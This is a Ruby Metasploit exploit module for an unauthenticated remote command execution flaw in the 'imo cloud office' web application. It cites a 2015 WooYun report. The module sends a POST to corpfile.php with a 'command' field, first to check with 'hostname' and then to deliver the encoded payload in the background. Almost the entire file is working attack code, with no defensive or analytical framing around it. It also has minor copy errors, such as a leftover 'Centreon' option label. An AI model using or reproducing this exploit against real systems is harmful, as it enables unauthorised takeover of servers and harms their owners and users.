require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name' => '	imo云办公室命令执行',
                      'Description' => %q{
                            无需登录等认证即可执行任意系统命令
      },
                      'Author' =>
                          [
                              '	xfkxfk',
                              '扶摇直上打飞机'
                          ],
                      'License' => MSF_LICENSE,
                      'References' =>
                          [
                              ['url', 'http://www.wooyun.org/bugs/wooyun-2015-0161079']
                          ],
                      'Privileged' => true,
                      'Platform' => ['unix'],
                      'Targets' => [['all of them', {}],],
                      'Arch' => ARCH_CMD,
                      'DefaultTarget' => 0,
          ))
    register_options(
        [
            Opt::RHOST(),
            Opt::RPORT(80),
            OptString.new('TARGETURI', [true, 'The URI of the Centreon Application', '/']),
        ], self.class)
  end

  def check
    res = send_request_cgi(
        {
            'method' => 'POST',
            'uri' => normalize_uri(target_uri.path, "corpfile.php"),
            'headers' =>
                {
                    "User-Agent" => "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0",
                },
            'vars_post' =>
                {
                    'type' => 'corpLogo',
                    'command' => 'hostname',
                }
        }, 4)
    if res and res.code == 200
      print_good("Target is vulnerable")
      return Exploit::CheckCode::Vulnerable
    else
      fail_with(Failure::Unknown, "#{rhost} can't get crumb value ")
    end
  end

  def post_payload
    print_status("start to exploit ....")
    res = send_request_cgi(
        {
            'method' => 'POST',
            'uri' => normalize_uri(target_uri.path, "corpfile.php"),
            'headers' =>
                {
                    "User-Agent" => "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0",
                },
            'vars_post' =>
                {
                    'type' => 'corpLogo',
                    'command' => payload.encoded + ' &',
                }
        }, 4)
  end

  def exploit
    if check == Exploit::CheckCode::Vulnerable
      post_payload
    end
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def targeturi
    datastore['TARGETURI']
  end

end